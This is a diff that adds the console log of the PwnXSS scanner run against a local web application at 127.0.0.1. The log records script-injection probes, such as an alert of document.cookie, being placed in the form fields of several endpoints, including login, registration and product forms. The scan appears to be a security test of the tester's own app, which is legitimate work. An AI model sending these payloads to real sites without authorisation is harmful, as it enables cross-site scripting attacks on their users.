@@ -1,0 +1,107 @@
+██████╗ ██╗    ██╗███╗   ██╗██╗  ██╗███████╗███████╗
+██╔══██╗██║    ██║████╗  ██║╚██╗██╔╝██╔════╝██╔════╝
+██████╔╝██║ █╗ ██║██╔██╗ ██║ ╚███╔╝ ███████╗███████╗ {v0.5 Final}
+██╔═══╝ ██║███╗██║██║╚██╗██║ ██╔██╗ ╚════██║╚════██║ https://github.com/pwn0sec/PwnXSS
+██║     ╚███╔███╔╝██║ ╚████║██╔╝ ██╗███████║███████║
+╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝╚══════╝
+<<<<<<< STARTING >>>>>>>
+
+[19:17:12] [INFO] Starting PwnXSS...
+***************
+[19:17:12] [INFO] Checking connection to: http://127.0.0.1:8081/
+[19:17:12] [INFO] Connection estabilished 200
+[19:17:12] [WARNING] Target have form with POST method: http://127.0.0.1:8081/
+[19:17:12] [INFO] Collecting form input key.....
+[19:17:12] [INFO] Form key name: user_email value: <script>prompt(5000/200)</script>
+[19:17:12] [INFO] Form key name: user_pass value: <script>prompt(5000/200)</script>
+[19:17:12] [INFO] Internal error: 'name'
+[19:17:12] [INFO] Sending payload (POST) method...
+[19:17:12] [INFO] Parameter page using (POST) payloads but not 100% yet...
+***************
+[19:17:12] [INFO] Checking connection to: http://127.0.0.1:8081/
+[19:17:12] [INFO] Connection estabilished 200
+[19:17:12] [WARNING] Target have form with POST method: http://127.0.0.1:8081/
+[19:17:12] [INFO] Collecting form input key.....
+[19:17:12] [INFO] Form key name: user_email value: <script>alert(document.cookie)</script>
+[19:17:12] [INFO] Form key name: user_pass value: <script>alert(document.cookie)</script>
+[19:17:12] [INFO] Internal error: 'name'
+[19:17:12] [INFO] Sending payload (POST) method...
+[19:17:12] [INFO] Parameter page using (POST) payloads but not 100% yet...
+***************
+[19:17:12] [INFO] Checking connection to: http://127.0.0.1:8081/updateprofile
+[19:17:12] [INFO] Connection estabilished 200
+[19:17:12] [WARNING] Target have form with POST method: http://127.0.0.1:8081/updateprofile
+[19:17:12] [INFO] Collecting form input key.....
+[19:17:12] [INFO] Form key name: user_email value: <script>alert(document.cookie)</script>
+[19:17:12] [INFO] Form key name: user_name value: <script>alert(document.cookie)</script>
+[19:17:12] [INFO] Form key name: shipping_address value: <script>alert(document.cookie)</script>
+[19:17:12] [INFO] Form key name: postal_code value: <script>alert(document.cookie)</script>
+[19:17:12] [INFO] Internal error: 'name'
+[19:17:12] [INFO] Sending payload (POST) method...
+[19:17:12] [INFO] Parameter page using (POST) payloads but not 100% yet...
+***************
+[19:17:13] [INFO] Checking connection to: http://127.0.0.1:8081/login
+[19:17:13] [INFO] Connection estabilished 200
+[19:17:13] [WARNING] Target have form with POST method: http://127.0.0.1:8081/login
+[19:17:13] [INFO] Collecting form input key.....
+[19:17:13] [INFO] Form key name: user_email value: <script>alert(document.cookie)</script>
+[19:17:13] [INFO] Form key name: user_pass value: <script>alert(document.cookie)</script>
+[19:17:13] [INFO] Internal error: 'name'
+[19:17:13] [INFO] Sending payload (POST) method...
+[19:17:13] [INFO] Parameter page using (POST) payloads but not 100% yet...
+***************
+[19:17:13] [INFO] Checking connection to: http://127.0.0.1:8081/logout
+[19:17:13] [INFO] Connection estabilished 200
+[19:17:13] [WARNING] Target have form with POST method: http://127.0.0.1:8081/logout
+[19:17:13] [INFO] Collecting form input key.....
+[19:17:13] [INFO] Form key name: user_email value: <script>alert(document.cookie)</script>
+[19:17:13] [INFO] Form key name: user_pass value: <script>alert(document.cookie)</script>
+[19:17:13] [INFO] Internal error: 'name'
+[19:17:13] [INFO] Sending payload (POST) method...
+[19:17:13] [INFO] Parameter page using (POST) payloads but not 100% yet...
+***************
+[19:17:13] [INFO] Checking connection to: http://127.0.0.1:8081/createproduct
+[19:17:13] [INFO] Connection estabilished 200
+[19:17:13] [WARNING] Target have form with POST method: http://127.0.0.1:8081/createproduct
+[19:17:13] [INFO] Collecting form input key.....
+[19:17:13] [INFO] Form key name: user_email value: <script>alert(document.cookie)</script>
+[19:17:13] [INFO] Form key name: title value: <script>alert(document.cookie)</script>
+[19:17:13] [INFO] Form key name: price value: <script>alert(document.cookie)</script>
+[19:17:13] [INFO] Internal error: 'type'
+[19:17:13] [INFO] Internal error: 'name'
+[19:17:13] [INFO] Sending payload (POST) method...
+[19:17:13] [INFO] Parameter page using (POST) payloads but not 100% yet...
+***************
+[19:17:13] [INFO] Checking connection to: http://127.0.0.1:8081/userhome
+[19:17:13] [INFO] Connection estabilished 200
+[19:17:13] [WARNING] Target have form with POST method: http://127.0.0.1:8081/
+[19:17:13] [INFO] Collecting form input key.....
+[19:17:13] [INFO] Sending payload (POST) method...
+[19:17:13] [INFO] Parameter page using (POST) payloads but not 100% yet...
+***************
+[19:17:13] [INFO] Checking connection to: http://127.0.0.1:8081/products
+[19:17:13] [INFO] Connection failed 500
+***************
+[19:17:14] [INFO] Checking connection to: http://127.0.0.1:8081/updateproduct
+[19:17:14] [INFO] Connection estabilished 200
+[19:17:14] [WARNING] Target have form with POST method: http://127.0.0.1:8081/updateproduct
+[19:17:14] [INFO] Collecting form input key.....
+[19:17:14] [INFO] Form key name: email value: <script>alert(document.cookie)</script>
+[19:17:14] [INFO] Form key name: title value: <script>alert(document.cookie)</script>
+[19:17:14] [INFO] Form key name: new_title value: <script>alert(document.cookie)</script>
+[19:17:14] [INFO] Form key name: new_price value: <script>alert(document.cookie)</script>
+[19:17:14] [INFO] Internal error: 'type'
+[19:17:14] [INFO] Internal error: 'name'
+[19:17:14] [INFO] Sending payload (POST) method...
+[19:17:14] [INFO] Parameter page using (POST) payloads but not 100% yet...
+***************
+[19:17:14] [INFO] Checking connection to: http://127.0.0.1:8081/registration
+[19:17:14] [INFO] Connection estabilished 200
+[19:17:14] [WARNING] Target have form with POST method: http://127.0.0.1:8081/registration
+[19:17:14] [INFO] Collecting form input key.....
+[19:17:14] [INFO] Form key name: user_email value: <script>alert(document.cookie)</script>
+[19:17:14] [INFO] Form key name: user_name value: <script>alert(document.cookie)</script>
+[19:17:14] [INFO] Form key name: user_pass value: <script>alert(document.cookie)</script>
+[19:17:14] [INFO] Internal error: 'name'
+[19:17:14] [INFO] Sending payload (POST) method...
+[19:17:14] [INFO] Parameter page using (POST) payloads but not 100% yet...
